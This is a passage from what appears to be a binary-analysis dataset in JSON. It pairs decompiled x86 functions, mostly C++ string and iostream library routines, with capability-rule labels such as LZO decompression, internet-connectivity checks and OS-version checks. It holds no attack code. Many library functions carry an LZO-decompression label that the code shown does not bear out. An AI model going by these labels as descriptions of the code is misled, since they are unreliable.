return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 558
    },
    "004be6b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be6b0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.004a5170(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x528a38, fcn.004a5220);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 506
    },
    "004be700": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nbool fcn.004be700(int32_t param_1, int32_t param_2, char *param_3, int32_t param_4)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    bool bVar8;\n    \n    uVar5 = param_4 - 1;\n    uVar6 = param_2 - 1U;\n    if (uVar5 < param_2 - 1U) {\n        uVar6 = uVar5;\n    }\n    if (uVar6 == 0) {\n        bVar7 = false;\n        bVar8 = true;\n    }\n    else {\n        uVar4 = 0;\n        do {\n            pcVar2 = param_3 + uVar5;\n            uVar5 = uVar5 - 1;\n            pcVar1 = param_1 + uVar4;\n            uVar4 = uVar4 + 1;\n            bVar7 = *pcVar2 != *pcVar1;\n            if (uVar6 <= uVar4) break;\n        } while (!bVar7);\n        bVar8 = *pcVar2 == *pcVar1;\n    }\n    cVar3 = *(param_1 + uVar6);\n    if ((uVar5 != 0) && (!bVar7)) {\n        do {\n            pcVar1 = param_3 + uVar5;\n            uVar5 = uVar5 - 1;\n            if (uVar5 == 0) break;\n        } while (*pcVar1 == cVar3);\n        bVar8 = *pcVar1 == cVar3;\n    }\n    if (cVar3 - 1U < 0x7e) {\n        bVar8 = (*param_3 == cVar3 || *param_3 < cVar3) & bVar8;\n    }\n    return bVar8;\n}\n",
        "token_count": 443
    },
    "004be7c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004be7c0(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar uStack29;\n    int32_t iStack28;\n    uchar auStack18 [2];\n    uchar auStack16 [12];\n    \n    fcn.0048ccb0(param_2, auStack18);\n    fcn.004bac90(auStack16);\n    if (*0x515a34 == 0) {\n        iVar2 = *(iStack28 + -4);\n        *(iStack28 + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack28 + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return;\n    }\n    fcn.0048b610(&uStack29);\n    return;\n}\n",
        "token_count": 213
    },
    "004be840": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be840(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.004a74a0(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x528ab4, fcn.004a7550);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 479
    },
    "004be8b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004be8b0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar6;\n    int32_t in_stack_00000020;\n    \n    iVar4 = fcn.004c2d80(8);\n    fcn.004a8270(arg_8h);\n    uVar5 = fcn.004c3330(iVar4, 0x528ad8, fcn.004a8320);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    fcn.004c3080(iVar4);\n    fcn.0043a8e0(uVar5);\n    uVar6 = fcn.004c33a0();\n    if (uVar6 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar6);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(iVar4 + 0x14) | 1;\n    *(iVar4 + 0x14) = uVar2;\n    if ((*(iVar4 + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar4 + 0x1c) = 0;\n        }\n        else {\n            *(iVar4 + 0x20) = 0;\n        }\n        return iVar4 + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    puVar1 = *(iVar4 + 0x68);\n    uVar5 = extraout_ECX;\n    if ((puVar1 != &stack0xfffffffc) && (puVar1 != NULL)) {\n        fcn.004c2c20(puVar1);\n    }\n    *(iVar4 + 0x68) = iVar3;\n    *(iVar4 + 100) = uVar5;\n    return iVar3 + in_stack_00000020 * 8;\n}\n",
        "token_count": 662
    },
    "004be900": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nint32_t __cdecl fcn.004be900(uint s, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint extraout_ECX;\n    char unaff_DI;\n    ulong uVar7;\n    char *apcStack36 [2];\n    uint32_t uStack28;\n    code *apcStack24 [2];\n    int32_t iStack16;\n    \n    uStack28 = s;\n    apcStack36[1] = 0x4be913;\n    sub.msvcrt.dll_strlen();\n    apcStack36[1] = 0x4be929;\n    uVar7 = fcn.00437ed0();\n    iVar1 = -uVar7;\n    *(&stack0xffffffec + iVar1) = s;\n    *(&stack0xffffffe8 + iVar1) = uVar7 >> 0x20;\n    *(&stack0xfffffff0 + iVar1) = &fcn.004be900::arg_ch;\n    *(&stack0xffffffe4 + iVar1) = &stack0x00000003 + iVar1 & 0xfffffff0;\n    *(&stack0xffffffe0 + iVar1) = 0x4be949;\n    fcn.00448e10();\n    *(&stack0xffffffe4 + iVar1) = 8;\n    *(&stack0xffffffe0 + iVar1) = 0x4be955;\n    iVar5 = fcn.004c2d80();\n    *(&stack0xffffffe4 + iVar1) = &stack0x00000003 + iVar1 & 0xfffffff0;\n    *(&stack0xffffffe0 + iVar1) = 0x4be961;\n    fcn.00490d10();\n    *(&stack0xffffffe8 + iVar1) = fcn.00490dc0;\n    *(&stack0xffffffe4 + iVar1) = 0x528914;\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4be97c;\n    uVar6 = fcn.004c3330();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4c4970;\n    fcn.004c3080();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4c4978;\n    fcn.0043a8e0();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4c4980;\n    fcn.004c3080();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4c4988;\n    fcn.0043a8e0();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4c4990;\n    fcn.004c3080();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4c4998;\n    fcn.0043a8e0();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4c49a0;\n    fcn.004c3080();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4c49a8;\n    fcn.0043a8e0();\n    *(&stack0xffffffe0 + iVar1) = iVar5;\n    *(&stack0xffffffdc + iVar1) = 0x4c49b0;\n    fcn.004c3080();\n    *(&stack0xffffffe0 + iVar1) = uVar6;\n    *(&stack0xffffffdc + iVar1) = 0x4c49b8;\n    fcn.0043a8e0();\n    *(&stack0xffffffdc + iVar1) = 0x4c49bd;\n    uVar7 = fcn.004c33a0();\n    *(&stack0xffffffe0 + iVar1) = uVar7;\n    if (uVar7 >> 0x20 != 1) {\n        *(&stack0xffffffdc + iVar1) = 0x4c49ca;\n        fcn.0043a8e0();\n    }\n    *(&stack0xffffffdc + iVar1) = 0x4c49cf;\n    fcn.004c2e40();\n    *(&stack0xffffffdc + iVar1) = 0x4c49d4;\n    fcn.004c2fb0();\n    uVar3 = *(iVar5 + 0x14) | 1;\n    *(iVar5 + 0x14) = uVar3;\n    if ((*(iVar5 + 0x10) & uVar3) == 0) {\n        if (unaff_DI == '\\0') {\n            *(iVar5 + 0x1c) = 0;\n        }\n        else {\n            *(iVar5 + 0x20) = 0;\n        }\n        return iVar5 + 0x1c;\n    }\n    *(&stack0xffffffe0 + iVar1) = \"ios_base::_M_grow_words allocation failed\";\n    *(&stack0xffffffdc + iVar1) = 0x4b973a;\n    iVar4 = fcn.004bdff0(*(&stack0xffffffe0 + iVar1));\n    puVar2 = *(iVar5 + 0x68);\n    uVar6 = extraout_ECX;\n    if ((puVar2 != &stack0xfffffffc) && (puVar2 != NULL)) {\n        *(&stack0xffffffe0 + iVar1) = puVar2;\n        *(&stack0xfffffffc + iVar1) = iVar4;\n        *(&stack0xfffffff8 + iVar1) = extraout_ECX;\n        *(&stack0xffffffdc + iVar1) = 0x4b96b5;\n        fcn.004c2c20();\n        iVar4 = *(&stack0xfffffffc + iVar1);\n        uVar6 = *(&stack0xfffffff8 + iVar1);\n    }\n    iVar1 = *(&stack0x00000020 + iVar1);\n    *(iVar5 + 0x68) = iVar4;\n    *(iVar5 + 100) = uVar6;\n    return iVar4 + iVar1 * 8;\n}\n",
        "token_count": 1539
    },
    "004c0a70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * fcn.004c0a70(int32_t *param_1, int32_t param_2)\n\n{\n    uint arg_10h;\n    \n    if (param_2 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(param_2);\n        fcn.004bd760(param_1, param_2, arg_10h);\n        return param_1;\n    }\n    fcn.004bbce0(*(param_1 + *(*param_1 + -0xc) + 0x14) | 1);\n    return param_1;\n}\n",
        "token_count": 131
    },
    "004c0d50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.004c0d50(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    ushort uVar2;\n    uint32_t arg_10h;\n    ushort *arg_ch_00;\n    int32_t *piVar3;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    ushort *puVar5;\n    ushort uStack76;\n    uint uStack64;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_bp_1ch;\n    uint var_ch;\n    \n    if (arg_ch == 0) {\n        uStack64 = 0x4c0e35;\n        fcn.004bc500();\n        return arg_8h;\n    }\n    uStack64 = 0x4c0d6f;\n    arg_10h = sub.msvcrt.dll_strlen();\n    uStack76 = in_stack_ffffffcc;\n    if (arg_10h < 0x3fffffff) {\n        uStack64 = 0x4c0d8d;\n        arg_ch_00 = fcn.004c2c50();\n        uStack76 = in_stack_ffffffcc;\n        if (arg_10h == 0) {\ncode_r0x004c0dec:\n            uStack64 = 0x4c0e02;\n            fcn.004bdb00(arg_8h, arg_ch_00, arg_10h);\n            uStack64 = 0x4c0e0d;\n            fcn.004c2c20();\n            return arg_8h;\n        }\n        piVar3 = *(arg_8h + *(*arg_8h + -0xc) + 0x7c);\n        if (piVar3 != NULL) {\n            puVar5 = arg_ch_00;\n            do {\n                uStack64 = 0x4c0de2;\n                uVar2 = (**(*piVar3 + 0x28))();\n                uStack76 = in_stack_ffffffcc;\n                *puVar5 = uVar2;\n                if (puVar5 == arg_ch_00 + (arg_10h - 1)) goto code_r0x004c0dec;\n                puVar5 = puVar5 + 1;\n                piVar3 = *(arg_8h + *(*arg_8h + -0xc) + 0x7c);\n            } while (piVar3 != NULL);\n        }\n        uStack64 = 0x4c0e47;\n        fcn.004bde60();\n        iVar4 = extraout_EDX;\n    }\n    else {\n        uStack64 = 0x4c0e4e;\n        fcn.004c33a0();\n        uStack64 = 0x4c0e5d;\n        fcn.004c2c20();\n        iVar4 = extraout_EDX_00;\n    }\n    if (iVar4 == 1) {\n        uStack64 = 0x4c0e6e;\n        fcn.004c2e40();\n        arg_8h = arg_8h + *(*arg_8h + -0xc);\n        arg_8h[5] = arg_8h[5] | 1;\n        if ((*(arg_8h + 4) & 1) == 0) {\n            uStack64 = 0x4c0eac;\n            fcn.004c32d0();\n            uStack64 = 0x4c0eb9;\n            fcn.004c2fb0();\n            uStack64 = 0x4c0ec1;\n            fcn.0043a8e0();\n            uStack64 = 0x4c0ec6;\n            fcn.004c2fb0();\n            uStack64 = 0x4c0ece;\n            fcn.0043a8e0();\n            piVar3 = fcn.004bdb00(in_stack_ffffffc8, &stack0xffffffb4, 1);\n            return piVar3;\n        }\n        uStack64 = 0x4c0e82;\n        fcn.004c32d0();\n    }\n    uStack64 = 0x4c0e87;\n    fcn.004c2e40();\n    iVar4 = *(*arg_8h + -0xc);\n    puVar1 = arg_8h + iVar4 + 0x14;\n    *puVar1 = *puVar1 | 1;\n    if ((*(arg_8h + iVar4 + 0x10) & 1) != 0) {\n        uStack64 = 0x4c0e9d;\n        fcn.004c32d0();\n    }\n    uStack64 = 0x4c0ea2;\n    fcn.004c2fb0();\n    return arg_8h;\n}\n",
        "token_count": 1132
    },
    "004c1090": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nint32_t ** __cdecl\nfcn.004c1090(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uint uVar3;\n    int32_t **var_8h;\n    uint var_ch;\n    uint *var_10h;\n    uint var_1ch;\n    int32_t *piStack56;\n    uint *puStack52;\n    uint var_ch_2;\n    \n    uVar1 = sub.msvcrt.dll_strlen(var_ch);\n    var_8h[1] = NULL;\n    *(var_8h + 2) = 0;\n    *var_8h = var_8h + 2;\n    ppiVar2 = var_10h[1] + uVar1;\n    fcn.004b1bc0();\n    if (uVar1 <= 0x7fffffffU - var_8h[1]) {\n        fcn.004b1d40(var_ch, uVar1);\n        fcn.004b1d40(*var_10h, var_10h[1]);\n        return var_8h;\n    }\n    uVar3 = fcn.004be310(0x52468a);\n    if (var_8h + 2 != *var_8h) {\n        fcn.004c2c30(*var_8h);\n    }\n    fcn.0043a8e0(uVar3);\n    *ppiVar2 = ppiVar2 + 2;\n    fcn.004b03b0(*piStack56, piStack56[1] + *piStack56, 0);\n    fcn.004b1d40(*puStack52, puStack52[1]);\n    return ppiVar2;\n}\n",
        "token_count": 513
    },
    "004c11b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004c11b0(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    arg_8h[1] = 0;\n    *arg_8h = arg_8h + 2;\n    *(arg_8h + 2) = 0;\n    fcn.004b1bc0(arg_10h[1] + 1);\n    fcn.004b05e0(arg_8h[1], 0, 1, arg_ch);\n    fcn.004b1d40(*arg_10h, arg_10h[1]);\n    return arg_8h;\n}\n",
        "token_count": 181
    },
    "004c1250": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004c1250(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_19h;\n    uint var_ch;\n    \n    iVar1 = sub.msvcrt.dll_strlen(arg_ch);\n    uVar2 = fcn.0048b140(0, 0, &var_19h);\n    *arg_8h = uVar2;\n    fcn.0048c930(*(*arg_10h + -0xc) + iVar1);\n    fcn.0048ba60(arg_ch, iVar1);\n    fcn.0048bb20(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 179
    },
    "004c12f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n\nint32_t * __cdecl fcn.004c12f0(int32_t *arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_9h;\n    \n    iVar1 = *arg_ch;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.0048b730(&var_9h, 0);\n    }\n    else if (*0x515a34 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    *arg_8h = iVar1;\n    fcn.0048bb20(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 208
    },
    "004c1380": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004c1380(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint uVar1;\n    uint var_19h;\n    uint var_ch;\n    \n    uVar1 = fcn.0048b140(0, 0, &var_19h);\n    *arg_8h = uVar1;\n    fcn.0048c930(*(*arg_10h + -0xc) + 1);\n    fcn.0048bcb0(1, arg_ch);\n    fcn.0048bb20(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 160
    },
    "004c1410": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nint32_t ** __cdecl\nfcn.004c1410(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t **ppiVar2;\n    uint uVar3;\n    int32_t **var_8h;\n    uint var_ch;\n    uint *var_10h;\n    uint var_1ch;\n    int32_t *piStack56;\n    uint *puStack52;\n    uint var_ch_2;\n    \n    uVar1 = sub.msvcrt.dll_wcslen(var_ch);\n    var_8h[1] = NULL;\n    *var_8h = var_8h + 2;\n    *(var_8h + 2) = 0;\n    ppiVar2 = var_10h[1] + uVar1;\n    fcn.004b4a30();\n    if (uVar1 <= 0x3fffffffU - var_8h[1]) {\n        fcn.004b4bc0(var_ch, uVar1);\n        fcn.004b4bc0(*var_10h, var_10h[1]);\n        return var_8h;\n    }\n    uVar3 = fcn.004be310(0x5249fa);\n    if (var_8h + 2 != *var_8h) {\n        fcn.004c2c30(*var_8h);\n    }\n    fcn.0043a8e0(uVar3);\n    *ppiVar2 = ppiVar2 + 2;\n    fcn.004b3120(*piStack56, *piStack56 + piStack56[1] * 2, 0);\n    fcn.004b4bc0(*puStack52, puStack52[1]);\n    return ppiVar2;\n}\n",
        "token_count": 517
    },
    "004c1530": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t * __cdecl fcn.004c1530(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    arg_8h[1] = 0;\n    *arg_8h = arg_8h + 2;\n    *(arg_8h + 2) = 0;\n    fcn.004b4a30(arg_10h[1] + 1);\n    fcn.004b3350(arg_8h[1], 0, 1, arg_ch);\n    fcn.004b4bc0(*arg_10h, arg_10h[1]);\n    return arg_8h;\n}\n",
        "token_count": 179
    },
    "004c15d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004c15d0(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_19h;\n    uint var_ch;\n    \n    iVar1 = sub.msvcrt.dll_wcslen(arg_ch);\n    puVar2 = fcn.004838f0(0, 0, &var_19h);\n    *(puVar2 + 3) = 0;\n    puVar2[2] = 0;\n    *puVar2 = 0;\n    *arg_8h = puVar2 + 3;\n    fcn.00484bb0(*(*arg_10h + -0xc) + iVar1);\n    fcn.00483bd0(arg_ch, iVar1);\n    fcn.00483cb0(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 219
    },
    "004c1680": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n\nint32_t * __cdecl fcn.004c1680(int32_t *arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_9h;\n    \n    iVar1 = *arg_ch;\n    if (*(iVar1 + -4) < 0) {\n        iVar1 = fcn.00483870(&var_9h, 0);\n    }\n    else if (*0x515a34 == 0) {\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar1 + -4) = *(iVar1 + -4) + 1;\n    }\n    *arg_8h = iVar1;\n    fcn.00483cb0(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 206
    },
    "004c1710": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004c1710(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint *puVar1;\n    uint var_19h;\n    uint var_ch;\n    \n    puVar1 = fcn.004838f0(0, 0, &var_19h);\n    puVar1[2] = 0;\n    *puVar1 = 0;\n    *(puVar1 + 3) = 0;\n    *arg_8h = puVar1 + 3;\n    fcn.00484bb0(*(*arg_10h + -0xc) + 1);\n    fcn.00483e50(1, arg_ch);\n    fcn.00483cb0(arg_10h);\n    return arg_8h;\n}\n",
        "token_count": 196
    },
    "004c1cd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004c1cd0(int32_t *arg_8h, int16_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint var_1dh;\n    uint var_ch;\n    \n    fcn.0049dc90(arg_8h, 0);\n    if (var_1dh == '\\0') {\n        iVar9 = *arg_8h;\n        uVar7 = 4;\n    }\n    else {\n        iVar9 = *(arg_8h + *(*arg_8h + -0xc) + 8);\n        iVar8 = 0x7fffffff;\n        if (0 < iVar9) {\n            iVar8 = iVar9;\n        }\n        fcn.004aebe0(arg_8h + *(*arg_8h + -0xc) + 0x6c);\n        piVar6 = fcn.004c01c0(&var_1dh + 1);\n        fcn.004aed00();\n        piVar1 = *(arg_8h + *(*arg_8h + -0xc) + 0x78);\n        piVar2 = piVar1[2];\n        if (piVar1[3] < piVar2 || piVar1[3] == piVar2) {\n            iVar5 = (**(*piVar1 + 0x24))();\n        }\n        else {\n            iVar5 = *piVar2;\n        }\n        var_30h = 0;\n        piVar2 = arg_ch + iVar8 + -1;\n        while (var_2ch = arg_ch,  arg_ch != piVar2) {\n            while( true ) {\n                arg_ch = var_2ch;\n                if (iVar5 == -1) goto code_r0x004c1ee8;\n                cVar4 = (**(*piVar6 + 8))(0x20, iVar5);\n                if (cVar4 != '\\0') goto code_r0x004c1de8;\n                arg_ch = var_2ch + 1;\n                *var_2ch = iVar5;\n                piVar3 = piVar1[2];\n                var_30h = var_30h + 1;\n                if (piVar3 < piVar1[3]) {\n                    iVar5 = *piVar3;\n                    piVar1[2] = piVar3 + 1;\n                }\n                else {\n                    iVar5 = (**(*piVar1 + 0x28))();\n                }\n                if (iVar5 == -1) {\n                    *arg_ch = 0;\n                    iVar9 = *arg_8h;\n                    *(arg_8h + *(iVar9 + -0xc) + 8) = 0;\n                    uVar7 = 2;\n                    goto code_r0x004c1e67;\n                }\n                if (piVar1[3] <= piVar1[2]) break;\n                iVar5 = *piVar1[2];\n                var_2ch = arg_ch;\n                if (arg_ch == piVar2) goto code_r0x004c1dde;\n            }\n            iVar5 = (**(*piVar1 + 0x24))();\n        }\ncode_r0x004c1dde:\n        var_2ch = piVar2;\n        if (iVar5 == -1) {\ncode_r0x004c1ee8:\n            *arg_ch = 0;\n            iVar9 = *arg_8h;\n            *(arg_8h + *(iVar9 + -0xc) + 8) = 0;\n            uVar7 = (-(var_30h == 0) & 4) + 2;\n        }\n        else {\ncode_r0x004c1de8:\n            *var_2ch = 0;\n            iVar9 = *arg_8h;\n            *(arg_8h + *(iVar9 + -0xc) + 8) = 0;\n            if (var_30h != 0) {\n                return arg_8h;\n            }\n            uVar7 = 4;\n        }\n    }\ncode_r0x004c1e67:\n    fcn.004bc500(uVar7 | *(arg_8h + *(iVar9 + -0xc) + 0x14));\n    return arg_8h;\n}\n",
        "token_count": 1047
    },
    "00401b7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
